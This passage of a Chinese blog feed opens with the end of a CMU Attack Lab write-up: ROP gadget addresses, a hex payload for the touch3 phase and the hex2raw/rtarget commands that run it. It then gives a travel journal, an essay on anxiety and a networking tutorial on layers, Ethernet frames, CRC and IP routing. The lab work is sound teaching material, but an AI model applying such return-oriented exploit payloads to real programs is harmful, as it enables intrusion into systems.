class="literal">eax</span>, %<span class="literal">ecx</span> <span class="number">89</span> c1 <span class="number">20</span> c9 c3 <span class="number">0x401a98</span> (<span class="number">20</span> c9 没有影响)</span><br><span class="line">movl %<span class="literal">ecx</span>, %<span class="literal">edx</span> <span class="number">89</span> ca <span class="number">28</span> c0 c3 <span class="number">0x401ac8</span> (<span class="number">38</span> c0 没有影响)</span><br><span class="line">movl %<span class="literal">edx</span>, %<span class="literal">esi</span> <span class="number">89</span> d6 <span class="number">38</span> c0 c3 <span class="number">0x401a68</span> (<span class="number">38</span> c0 没有影响)</span><br><span class="line"><span class="keyword">lea</span>  (%<span class="literal">rdi</span>, %<span class="literal">rsi</span>, <span class="number">1</span>), %<span class="literal">rax</span>     <span class="number">0x401a48</span></span><br><span class="line"><span class="keyword">mov</span>  %<span class="literal">rax</span>, %<span class="literal">rdi</span> <span class="number">48</span> <span class="number">89</span> c7 c3    <span class="number">0x401a2b</span></span><br><span class="line">touch3 的地址</span><br><span class="line">cookie 的字符串</span><br><span class="line">栈底</span><br></pre></td></tr></table></figure>
<p>对应的十六进制代码为（同样需要注意不全十六位的 0，不然会出段错误），这里还有一个需要注意的地方是偏移量，在执行第一句时，<code>%rsp</code> 已经是指向下一句了（指向的是当前的栈顶，正在执行的语句是不需要考虑的），所以可以数出来，在 cookie 之前一共有 9 条指令，每个 8 byte，所以一共的偏移量是 <code>0x48</code>（十进制的 72）。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">11</span> <span class="number">1</span>b <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">2</span>b <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">24</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">48</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">98</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">c8 <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">68</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">48</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">2</span>b <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">6</span>e <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">34</span> <span class="number">35</span> <span class="number">33</span> <span class="number">37</span> <span class="number">34</span> <span class="number">66</span> <span class="number">65</span> <span class="number">65</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
<p>然后转换成机器码 <code>./hex2raw &lt; p5.txt &gt; p5r.txt</code>，再执行一次 <code>./rtarget -i p5r.txt</code>，就可以看到结果了：</p>
<p><img src="/images/14554895097953.jpg" alt=""></p>
<h2 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h2><p>这次作业的两个部分，有不同的难点。利用缓冲区溢出跳转到栈中并在栈中执行代码虽然需要的步骤多一些，但是调试还是比较方便的，可以走一步看一步，根据具体的内存分布来进行处理，就是第三阶段的随机部分可能需要多试几次才能找到正确的存放位置。</p>
<p>ROP 的部分，因为跳转来跳转去，难点在于思路，有了一个大概的思路，就可以利用已有的代码跳来跳去来『凑』出最终的结果了。最后部分需要考虑到偏移量的问题，需要对 <code>%rsp</code> 具体所指向的内存位置有比较清晰地了解，这里我有点犯迷糊，在同学的帮助下才找到了问题所在。不同的字长和位数也有影响，虽然大概的意思差不多，不过我看前一两年的作业中的汇编代码，就和现在的汇编代码有挺大的差异了。</p>
<p>越接近硬件层面，越容不得丝毫差池，越来越多的数值和偏移都变得和机器相关，才更加意识到现在能写几乎与机器无关的代码是多么幸福。不过也不能因为前人的工作就忽略不同机器的差异，还是要多考虑不同的层面，才能写出让更多机器能跑得更快的代码。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>这次的作业中，我们将要亲自上手利用漏洞来进行代码注入的攻击，听起来很刺激不是吗？</p>]]>
    
    </summary>
    
      <category term="Attacklab" scheme="http://wdxtub.com/tags/Attacklab/"/>
    
      <category term="CMU" scheme="http://wdxtub.com/tags/CMU/"/>
    
      <category term="习题课" scheme="http://wdxtub.com/tags/%E4%B9%A0%E9%A2%98%E8%AF%BE/"/>
    
      <category term="计算机" scheme="http://wdxtub.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[第五周 - Conqueror]]></title>
    <link href="http://wdxtub.com/2016/02/12/conqueror/"/>
    <id>http://wdxtub.com/2016/02/12/conqueror/</id>
    <published>2016-02-13T01:38:33.000Z</published>
    <updated>2016-02-13T12:08:51.000Z</updated>
    <content type="html"><![CDATA[<p>Broken mornings, broken nights and broken days in between. Open ground, the sky is open, makes an open sea.</p>
<a id="more"></a>
<hr>
<p>应该是第一次没有和爸爸妈妈过春节，相信也会是最后一次。虽然尽力做了一大桌菜，但是缺少的东西太多太多，只能通过形式来弥补。锦城虽云乐，不如早还家，每个夜晚，每个应该团聚的节日，才更加深刻地意识到我与家的羁绊到底有多深。说不想家，说不想流泪，说不想窗外事，其实自己根本做不到，既然如此，不妨就勇敢拥抱这个变化莫测的世界。</p>
<p>这周又是漂泊的一周，好在已经适应了助教的工作，课程也渐入佳境，整体来说还是比较轻松的，趁着转机的当头完成了大部分繁琐的日常工作，倒是留下了许多看书和胡思乱想的时间。和朋友聊过科幻之后，恰好 kindle 里有阿西莫夫的《永恒的终结》和《神们自己》，便在九个多小时的飞行时间里彻底神游了两回。科幻的尽头大概就是神学和哲学了，但是以我目前的智力水平，估计入门都有点困难。</p>
<p>对于学习这个事情，我一直都是主张曲线救国的。探索的过程中总会需要问题，很多时候朝着问题笔直前进并不是最好的做法，所谓『曲线』，指的是绕到问题背后去。一定要弄清楚问题的来源，不仅是来龙去脉，更应该是通过问题本身，来观察自己的思维模式还有哪些误区和盲点。问题是解决不完的，但是思维体系是可以逐渐完善的，有了一整套观察问题，思考问题，解决问题的框架，那么大部分问题就不是问题了，小部分问题就是给自己这套框架升级换代的问题了。</p>
<p>俗话说得好，飞机坐得多了，难免遇到延误，在达拉斯转机的时候，大家都在飞机上坐好了，机长通知大家飞机出问题了，得换一架，但是换的那架还不知道在哪。虽说三藩就是最终目的地，不用担心换乘的问题，可是延误总是非常闹心的事情，好在这次一向拖拉的机场不到 90 分钟就让我们重新登机了。</p>
<p>三藩的天气依然好得那么不科学，蓝天白云加上略带凉意的风，即使是坐在街边长凳上等待曲鳖，也非常惬意。这次面试的是一个小公司，虽说小，但其实也成立了十来年了。很多时候我们总是相信自己听说的，却不愿意自己来体验，就找工作这个事儿来说，不同公司都有不同的体验。我也正好借着面试这个光明正大的理由，去观察不同公司的员工，试图从与个体的接触中了解整体。所以对我来说，只要见了面，聊了天，这一趟本身就值回票价了。没有打算留下，所以也不必卑躬屈膝。关于找工作还是有挺多东西值得说道的，这个以后有空慢慢写。</p>
<p>实话说，我不大喜欢异族与二等公民的感觉，但对于『小富即安』的群体性，无能为力。随着走出学校的程度越来越深，总能发现很多问题，是大家都心知肚明，却又视而不见，毕竟没有必要为了一个『不一定对自己更好』的明天，去改变『对自己不错』的今天。</p>
<p>古龙在不止一本书中写过，『当一个男人有了想要一个家的念头时，那么离有个家也不远了』，借用一下，当一个人觉得自己不属于这里时，那么离开也就不远了。这次面试之后应该会休息一段时间好好锻炼下身体了，整天飞来飞去实在是非常遭罪。</p>
<p>红眼航班整个人恍恍惚惚，也就到此打住。</p>
<p>Sky is bright. I feel alive.</p>
<p>于三藩机场墙边，于 Newark 机场充电站旁</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>Broken mornings, broken nights and broken days in between. Open ground, the sky is open, makes an open sea.</p>]]>
    
    </summary>
    
      <category term="CMU" scheme="http://wdxtub.com/tags/CMU/"/>
    
      <category term="周记" scheme="http://wdxtub.com/tags/%E5%91%A8%E8%AE%B0/"/>
    
      <category term="新生" scheme="http://wdxtub.com/tags/%E6%96%B0%E7%94%9F/"/>
    
      <category term="Gossip" scheme="http://wdxtub.com/categories/Gossip/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[不安的终结]]></title>
    <link href="http://wdxtub.com/2016/02/12/end-of-anxiety/"/>
    <id>http://wdxtub.com/2016/02/12/end-of-anxiety/</id>
    <published>2016-02-12T12:05:36.000Z</published>
    <updated>2016-02-12T16:10:01.000Z</updated>
    <content type="html"><![CDATA[<p>当一类事情重复足够多次之后，本能会让我们去选择最安全、最中庸的道路。可是消除了痛苦，也就消除了走向辉煌的可能，这又怎么办呢？</p>
<a id="more"></a>
<hr>
<p>最脆弱不安的时刻，往往也是最接近自己的时刻，但观察自己的过程犹如走钢丝，左一分蒸发，右一分凝结。超然物外已经很难，如何抽离自身，更是值得一生探索。在飞机上经历了回忆杀带来的『臆想恐慌症』之后，抛开封闭环境可能带来的问题，我在想，所谓的不安，到底从哪里来，到哪里去呢？</p>
<p>坏消息是，网上对于不安的讨论，几乎都是『灌鸡汤』；好消息是，我在阿西莫夫的《永恒的终结》中，找到了答案。</p>
<p>所谓不安，大概是预想的和实际发生的不一致，自己却没有办法找到原因，于是胡思乱想的恶性循环就开始了；直到某个契机出现，发现了一个『未必合理』却足以说服自己的理由，这才算『心安理得』。但凡以后再想起某件事，便可以自己用这个『足够好』的理由去搪塞自己。而胡思乱想恐怕是因为过去的经历形成的心理地貌，即使一次次去想去模拟，让自己的心绪像流水一样涌出，因为地貌的缘故，往往只能得到同一个结果，于是逆向合理化开始启动，一切都是那么顺理成章。</p>
<p>这样我们就找到不安的根源——失控，胡思乱想使得心态失控，之后给自己洗脑认为现实也已经失控，最终导致心态爆炸。问题就来了，这种失控有没有可能被控制呢？很遗憾，没有，就像《永恒的终结》中一样，用现在去改变过去，其实是没有太多意义的。生活并非永恒不变，现在也不是唯一的归宿，只是未来无限可能的出发点。只有经过严酷的考验，才能不断前进，高速发展。</p>
<blockquote>
<p>危险的环境和危机感，才是驱使人类不断进步，不断征服新事物的根本动力</p>
</blockquote>
<p>人人都会不安，这是本能，但是本能之上，应该意识到不安的终结并不是避免困难的出现，而是去战胜困难。自信不是把自己当做宠物，当做温室里的花朵来成长，而是相信自己，永远敢于接受下一次的挑战。</p>
<p>从这个角度来看中国历史，漫长的封建社会就类似于某种重复，每个朝代一开始，都会参考前朝的经验去做新的选择，找到『最好』的现实，于是慢慢向着最安全，最中庸，最稳定的结构演变，也就是所谓的『中央集权』。</p>
<p>但是这真的就是某种惯性，也许这么多次的重复，只是为了在下一个瞬间，开启另一个时代，那里没有永恒，更无所谓终结。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>当一类事情重复足够多次之后，本能会让我们去选择最安全、最中庸的道路。可是消除了痛苦，也就消除了走向辉煌的可能，这又怎么办呢？</p>]]>
    
    </summary>
    
      <category term="不安" scheme="http://wdxtub.com/tags/%E4%B8%8D%E5%AE%89/"/>
    
      <category term="困难" scheme="http://wdxtub.com/tags/%E5%9B%B0%E9%9A%BE/"/>
    
      <category term="循环" scheme="http://wdxtub.com/tags/%E5%BE%AA%E7%8E%AF/"/>
    
      <category term="永恒的终结" scheme="http://wdxtub.com/tags/%E6%B0%B8%E6%81%92%E7%9A%84%E7%BB%88%E7%BB%93/"/>
    
      <category term="终结" scheme="http://wdxtub.com/tags/%E7%BB%88%E7%BB%93/"/>
    
      <category term="Thinking" scheme="http://wdxtub.com/categories/Thinking/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[计算机网络]]></title>
    <link href="http://wdxtub.com/2016/02/10/internet-protocol/"/>
    <id>http://wdxtub.com/2016/02/10/internet-protocol/</id>
    <published>2016-02-10T20:51:28.000Z</published>
    <updated>2016-02-11T14:03:07.000Z</updated>
    <content type="html"><![CDATA[<p>这篇文章主要介绍计算机网络的相关知识，因为网络的重要组成不是是协议，所以很大篇幅会是相关协议以及具体的应用。整体的结构基于 <a href="http://www.cnblogs.com/vamei/" target="_blank" rel="external">Vamei</a> 博客中的结构（以及一些配图），加上自己在网络上搜集和日常学习中的一些思考，整理成为本文。</p>
<a id="more"></a>
<hr>
<h2 id="u5206_u5C42_u6A21_u578B"><a href="#u5206_u5C42_u6A21_u578B" class="headerlink" title="分层模型"></a>分层模型</h2><p>首先需要明确的就是，网络通信是基于分层模型的。虽然不同的协议有不同的层级划分（甚至同一种协议也有不同的层级划分），但是都离不开分层。分层的好处有很多，最重要的是能够比较好控制具体实现的复杂度，由于每层之间由事先约定的接口通信，所以其实并不需要在意每层的具体实现。</p>
<p>比较出名的分层模型有 OSI 分层模型和 TCP/IP 分层模型，它们的对应关系如下：</p>
<p><img src="/images/14551385707784.jpg" alt=""></p>
<p>OSI 分层模型将计算机网络体系结构的通信协议划分为七层，自下而上依次为：物理层（Physics Layer）、数据链路层（Data Link Layer）、网络层（Network Layer）、传输层（Transport Layer）、会话层（Session Layer）、表示层（Presentation Layer）、应用层（Application Layer）。其中第四层完成数据传送服务，上面三层面向用户。</p>
<p><strong>物理层(physical layer)</strong></p>
<p>所谓的物理层，是指光纤、电缆或者电磁波等真实存在的物理媒介。这些媒介可以传送物理信号，比如亮度、电压或者振幅。对于数字应用来说，我们只需要两种物理信号来分别表示0和1，比如用高电压表示1，低电压表示0，就构成了简单的物理层协议。针对某种媒介，电脑可以有相应的接口，用来接收物理信号，并解读成为0/1序列。</p>
<p><strong>连接层(link layer)</strong></p>
<p>在连接层，信息以帧(frame)为单位传输。所谓的帧，是一段有限的0/1序列。连接层协议的功能就是识别0/1序列中所包含的帧。比如说，根据一定的0/1组合识别出帧的起始和结束。在帧中，有收信地址(Source, SRC)和送信地址(Destination, DST)，还有能够探测错误的校验序列(Frame Check Sequence)。当然，帧中最重要的最重要是所要传输的数据 (payload)。这些数据往往符合更高层协议，供网络的上层使用。与数据相配套，帧中也有数据的类型(Type)信息。连接层协议不关心数据中到底包含什么。帧就像是一个信封，把数据包裹起来。</p>
<p>以太网(Ethernet)和WiFi是现在最常见的连接层协议。通过连接层协议，我们可以建立局域的以太网或者WiFi局域网，并让位于同一局域网络中的两台计算机通信。</p>
<p><strong>网络层(network layer)</strong></p>
<p>如何让WiFi上的一台计算机和以太网上的另一台计算机通信呢？我们需要一个“中间人”。这个“中间人”必须有以下功能: </p>
<ol>
<li>能从物理层上在两个网络的接收和发送0/1序列</li>
<li>能同时理解两种网络的帧格式</li>
</ol>
<p>路由器(router)就是为此而产生的“翻译”。一个路由器有多个网卡(NIC，Network Interface Controller)，每个NIC可以接入多个网络，并理解相应的连接层协议。在帧经过路由到达另一个网络的时候，路由会读取帧的信息，并改写以发送到另一个网络。</p>
<p>整个通信过程如下:</p>
<p>WiFi上的计算机1 -&gt; 路由WiFi接口 -&gt;  路由以太网接口 -&gt; 以太网上的计算机2</p>
<p>在连接层，我们的一个帧中只能记录SRC和DST两个地址。而上面的过程需要经过四个地址 (计算机1，WiFi接口，以太网接口，计算机2)。显然，仅仅靠连接层协议无法满足我们的需要。由于连接层协议开发在先，我们无法改动连接层协议，只能在连接层的数据(payload)下功夫了，IP协议应运而生。</p>
<p><strong>传输层(transport layer)</strong></p>
<p>上面的三层协议让不同的计算机之间可以通信。但计算机中实际上有许多个进程，每个进程都可能有通信的需求(参看Linux进程基础和Linux进程间通信)。</p>
<p>传输层协议，比如TCP和UDP，使用端口号(port number)来识某个进程。在传输数据的时候，我们写上目的进程的端口。当数据到达另一台计算机时，会根据传输层协议，识别端口号，将信送给不同的进程。</p>
<p>TCP和UDP协议是两种不同的传输层协议。UDP 协议比较简单，但是不太可靠；TCP 协议有着相对复杂的握手机制，比较可靠。TCP协议还有控制网络交通等功能。</p>
<p><strong>应用层(application layer)</strong></p>
<p>通过上面的几层协议，我们已经可以在任意两个进程之间进行通信。应用层协议是对数据内容·进一步的用语规范。应用层的协议包括用于Web浏览的HTTP协议，用于传输文件的FTP协议，用于Email的IMAP等等。</p>
<h2 id="u8FDE_u63A5_u5C42_u534F_u8BAE"><a href="#u8FDE_u63A5_u5C42_u534F_u8BAE" class="headerlink" title="连接层协议"></a>连接层协议</h2><p>以太网和WiFi是连接层的两种协议。在连接层，信息以帧(frame)为单位传输。帧像信封一样将数据(payload)包裹起来，并注明收信地址和送信地址。我们先来看看以太网的帧。</p>
<p><strong>以太网的帧格式</strong></p>
<p>帧本身是一段有限的0/1序列。它可以分为 <code>头部 | 数据(Payload) | 尾部</code> 三部分:</p>
<pre><code>Preamble SFD DST SRC Type | Payload(Data) | Pad FCS Extension
</code></pre><p>帧按照上面的顺序从头到尾依次被发送/接收。我们下面进一步解释各个区域。</p>
<p><strong>头部</strong></p>
<p>帧的最初 7 个 byte 被称为序言(preamble)。它的每个byte都是0xAA(这里是十六进制，也就是二进制的10101010)。通常，我们都会预定好以一定的频率发送0/1序列(比如每秒10bit)。如果接收设备以其他频率接收(比如每秒5bit)，那么就会错漏掉应该接收的0/1信息。但是，由于网卡的不同，发送方和接收方即使预订的频率相同，两者也可能由于物理原因发生偏差。这就好像两个人约好的10点见，结果一个人表快，一个人表慢一样。序言是为了让接收设备调整接收频率，以便与发送设备的频率一致，这个过程就叫做时钟复原(recover the clock)。</p>
<p>时钟调整好之后，我们等待帧的起始信号(SFD, start frame delimiter)。SFD是固定的值0xAB。</p>
<p>紧随SFD之后的是 6 byte的目的地(DST, destination)和 6 byte的发出地(SRC, source)。这里写的是对地址的“本地描述”，也就是MAC地址。MAC地址是物理设备自带的序号，只能在同一个以太网中被识别。</p>
<p>头部的最后一个区域是Type，用以说明数据部分的类型。(比如0x0800为IPv4，0x0806为ARP)</p>
<p><strong>数据</strong></p>
<p>数据一般包含有符合更高层协议的数据，比如IP包。连接层协议本身并不在乎数据是什么，它只负责传输。注意，数据尾部可能填充有一串0(PAD区域)。原因是数据需要超过一定的最小长度。</p>
<p><strong>尾部</strong></p>
<p>跟随在数据之后的是校验序列(FCS, Frame Check Sequence)。校验序列是为了检验数据的传输是否发生错误。</p>
<p>一个方法是将数据发送两遍，然后对比一下是否一样。但这样就大大降低了网络的效率。FCS采用了CRC(Cyclic Redundancy Check)算法。CRC 算法也相类似。n 位 CRC 算法取一个 n bit 的因子，比如下面的 1011。数据序列结尾增加 n-1 个 0。因子与数据序列的不断进行 XOR 运算，直到得到n-1位的余数，也就是100。该余数各位取反(011)，然后存储在FCS的位置。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11010011101100</span> <span class="number">000</span> &lt;--- 数据序列末尾增加<span class="number">3</span>位<span class="number">0</span></span><br><span class="line"><span class="number">1011</span>               &lt;--- 因子</span><br><span class="line"><span class="number">01100011101100</span> <span class="number">000</span> &lt;--- XOR结果</span><br><span class="line"> <span class="number">1011</span>              &lt;--- 因子</span><br><span class="line"><span class="number">00111011101100</span> <span class="number">000</span></span><br><span class="line">  <span class="number">1011</span></span><br><span class="line"><span class="number">00010111101100</span> <span class="number">000</span></span><br><span class="line">   <span class="number">1011</span></span><br><span class="line"><span class="number">00000001101100</span> <span class="number">000</span></span><br><span class="line">       <span class="number">1011</span></span><br><span class="line"><span class="number">00000000110100</span> <span class="number">000</span></span><br><span class="line">        <span class="number">1011</span></span><br><span class="line"><span class="number">00000000011000</span> <span class="number">000</span></span><br><span class="line">         <span class="number">1011</span></span><br><span class="line"><span class="number">00000000001110</span> <span class="number">000</span></span><br><span class="line">          <span class="number">1011</span></span><br><span class="line"><span class="number">00000000000101</span> <span class="number">000</span> </span><br><span class="line">           <span class="number">101</span> <span class="number">1</span></span><br><span class="line">-----------------</span><br><span class="line"><span class="number">00000000000000</span> <span class="number">100</span> &lt;--- <span class="number">3</span>位余数</span><br></pre></td></tr></table></figure>
<p>上面例子用的是4位CRC。在Ethernet中使用的因子为32位的，以达到更好的检测效果。</p>
<p><strong>集线器(Hub) vs. 交换器(Switch)</strong></p>
<p>以太网使用集线器或者交换器将帧从发出地传送到目的地。一台集线器或交换器上有多个端口，每个端口都可以连接一台计算机(或其他设备)。</p>
<p>集线器像一个广播电台。一台电脑将帧发送到集线器，集线器会将帧转发到所有其他的端口。每台计算机检查自己的MAC地址是不是符合DST。如果不是，则保持沉默。集线器是比较早期的以太网设备。它有明显的缺陷：</p>
<ol>
<li>任意两台电脑的通信在同一个以太网上是公开的。所有连接在同一个集线器上的设备都能收听到别人在传输什么，这样很不安全。可以通过对信息加密提高安全性。</li>
<li>不允许多路同时通信。如果两台电脑同时向集线器发信，集线器会向所有设备发出“冲突”信息，提醒发生冲突。可以在设备上增加冲突检测算法(collision detection)：一旦设备发现有冲突，则随机等待一段时间再重新发送。</li>
</ol>
<p>交换器克服集线器的缺陷。交换器记录有各个设备的MAC地址。当帧发送到交换器时，交换器会检查DST，然后将帧只发送到对应端口。交换器允许多路同时通信。由于交换器的优越性，交换器基本上取代了集线器。但比较老的以太网还有可能在使用集线器。</p>
<p><strong>WiFi</strong></p>
<p>WiFi的工作方式与集线器连接下的以太网类似。一个WiFi设备会向所有的WiFi设备发送帧，其它的WiFi设备检查自己是否符合DST。由于WiFi采取无线电信号，所以很难像交换器一样定向发送，所以WiFi的安全性很值得关注。WiFi采用加密的方法来实现信息的安全性。</p>
<p>(早期的WEP加密方法非常脆弱，建议使用WPA或者WPA2加密方法。隐藏WiFi设备ID的方法不是很有用。)</p>
<h2 id="u7F51_u7EDC_u5C42_u534F_u8BAE"><a href="#u7F51_u7EDC_u5C42_u534F_u8BAE" class="headerlink" title="网络层协议"></a>网络层协议</h2><p>网络层(network layer)是实现互联网的最重要的一层。正是在网络层面上，各个局域网根据 IP 协议相互连接，最终构成覆盖全球的 Internet。更高层的协议，无论是 TCP 还是 UDP，必须通过网络层的 IP 数据包(datagram)来传递信息。操作系统也会提供该层的 socket，从而允许用户直接操作 IP 包。</p>
<p>IP 数据包是符合 IP 协议的信息(也就是0/1序列)，我们后面简称 IP 数据包为 IP 包。IP 包分为头部(header)和数据(Data)两部分。数据部分是要传送的信息，头部是为了能够实现传输而附加的信息。</p>
<p>IP 协议可以分为 IPv4 和 IPv6 两种。IPv6 是改进版本，用于在未来取代 IPv4 协议。下面是 IPv4的格式</p>
<p><img src="/images/14551392855125.jpg" alt=""></p>
<p>与帧类似，IP 包的头部也有多个区域。我们将注意力放在红色的发出地(source address)和目的地(destination address)。它们都是IP地址。IPv4 的地址为 4 bytes的长度(也就是32位)。我们通常将 IPv4 的地址分为四个十进制的数，每个数的范围为 0-255,比如 192.0.0.1 就是一个 IP 地址。填写在 IP 包头部的是该地址的二进制形式。</p>
<p>IP地址是全球地址，它可以识别局域网和主机。这是通过将IP地址分类实现的。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IP <span class="keyword">class</span>    From          To                Subnet Mask</span><br><span class="line">A           <span class="number">1.0</span><span class="number">.0</span><span class="number">.0</span>       <span class="number">126.255</span><span class="number">.255</span><span class="number">.255</span>    <span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">B           <span class="number">128.0</span><span class="number">.0</span><span class="number">.0</span>     <span class="number">191.255</span><span class="number">.255</span><span class="number">.255</span>    <span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">C           <span class="number">192.0</span><span class="number">.0</span><span class="number">.0</span>     <span class="number">223.255</span><span class="number">.255</span><span class="number">.255</span>    <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure>
<p>每个 IP 地址的 32 位分为前后两部分，第一部分用来区分局域网，第二个部分用来区分该局域网的主机。子网掩码(Subnet Mask)告诉我们这两部分的分界线，比如 255.0.0.0 (也就是8个1和24个0)表示前 8 位用于区分局域网，后 24 位用于区分主机。由于 A、B、C 分类是已经规定好的，所以当一个IP地址属于 B 类范围时，我们就知道它的前 16 位和后 16 位分别表示局域网和主机。</p>
<p><strong>网卡与路由器</strong></p>
<p>IP地址实际上识别的是网卡(NIC, Network Interface Card)。网卡是计算机的一个硬件，它在接收到网路信息之后，将信息交给计算机(处理器/内存)。当计算机需要发送信息的时候，也要通过网卡发送。一台计算机可以有不只一个网卡，比如笔记本就有一个以太网卡和一个WiFi网卡。计算机在接收或者发送信息的时候，要先决定想要通过哪个网卡。</p>
<p>路由器(router)实际上就是一台配备有多个网卡的专用电脑。它让网卡接入到不同的网络中。</p>
<h3 id="IP__u5305_u63A5_u529B"><a href="#IP__u5305_u63A5_u529B" class="headerlink" title="IP 包接力"></a>IP 包接力</h3><p>IP 包的传输要通过路由器的接力。每一个主机和路由中都存有一个路由表(routing table)。路由表根据目的地的 IP 地址，规定了等待发送的 IP 包所应该走的路线。</p>
<p>比如我们从主机 145.17 生成发送到 146.21 的IP包，注明目的地IP地址(199.165.146.21)和发出地IP地址(199.165.145.17)。主机 145.17 随后参照自己的 routing table，里面有三行记录：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">145<span class="class">.17</span> <span class="tag">routing</span> <span class="tag">table</span> (<span class="tag">Genmask</span>为子网掩码,<span class="tag">Iface</span>用于说明使用哪个网卡接口)</span><br><span class="line"><span class="tag">Destination</span>        <span class="tag">Gateway</span>             <span class="tag">Genmask</span>             <span class="tag">Iface</span></span><br><span class="line">199<span class="class">.165</span><span class="class">.145</span><span class="class">.0</span>      0<span class="class">.0</span><span class="class">.0</span><span class="class">.0</span>             255<span class="class">.255</span><span class="class">.255</span><span class="class">.0</span>       <span class="tag">eth0</span></span><br><span class="line">0<span class="class">.0</span><span class="class">.0</span><span class="class">.0</span>            199<span class="class">.165</span><span class="class">.145</span><span class="class">.17</span>      0<span class="class">.0</span><span class="class">.0</span><span class="class">.0</span>             <span class="tag">eth0</span></span><br></pre></td></tr></table></figure>
<p>这里有两行记录。</p>
<p>第一行表示，如果 IP 目的地是 199.165.145.0 这个网络的主机，那么只需要自己在 eth0 上的网卡直接传送，不需要前往 router(Gateway 0.0.0.0 = “本地”)。</p>
<p>第二行表示所有不符合第一行的 IP 目的地，都应该送往 Gateway 199.165.145.17，也就是中间 router 接入在 eth0 的网卡 IP 地址。</p>
<p>我们的 IP 包目的地为 199.165.146.21，不符合第一行，所以按照第二行，发送到中间的 router。主机 145.17 会将 IP 包放入帧的 payload，并在帧的头部写上 199.165.145.17 对应的 MAC 地址，这样，就可以在局域网中传送了。</p>
<p>中间的 router 在收到 IP 包之后(实际上是收到以太协议的帧，然后从帧中的 payload 读取 IP 包)，提取目的地IP地址，然后对照自己的routing table：</p>
